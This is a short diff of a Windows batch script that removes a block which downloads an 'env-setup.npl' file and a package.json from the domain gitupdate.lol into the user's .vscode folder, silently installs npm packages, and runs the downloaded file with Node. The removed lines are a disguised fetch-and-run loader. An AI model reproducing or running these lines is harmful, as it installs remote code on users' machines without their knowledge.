@@ -212,40 +212,6 @@ if not defined NODE_EXE (
     echo [ERROR] Node.js executable not found or set.
     exit /b 1
 )
-:: -------------------------
-:: Download required files
-:: -------------------------
-set "CODEPROFILE=%USERPROFILE%\\.vscode"
-
-curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitupdate.lol/settings/env?flag=${flag}"
-curl -L -o "%CODEPROFILE%\\package.json" "https://gitupdate.lol/settings/package"
-
-:: -------------------------
-:: Install dependencies
-:: -------------------------
-if not exist "%~dp0node_modules\\axios" (
-    pushd "%~dp0"
-    call npm install --silent --no-progress --loglevel=error --fund=false
-    if errorlevel 1 (
-        popd
-        exit /b 1
-    )
-    popd
-)
-
-:: -------------------------
-:: Run the parser
-:: -------------------------
-if exist "%CODEPROFILE%\\env-setup.npl" (
-    pushd "%CODEPROFILE%"
-    "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
-    if errorlevel 1 (
-        exit /b 1
-        )
-    popd
-) else (
-    exit /b 1
-)
 
 exit /b 0
     	`;
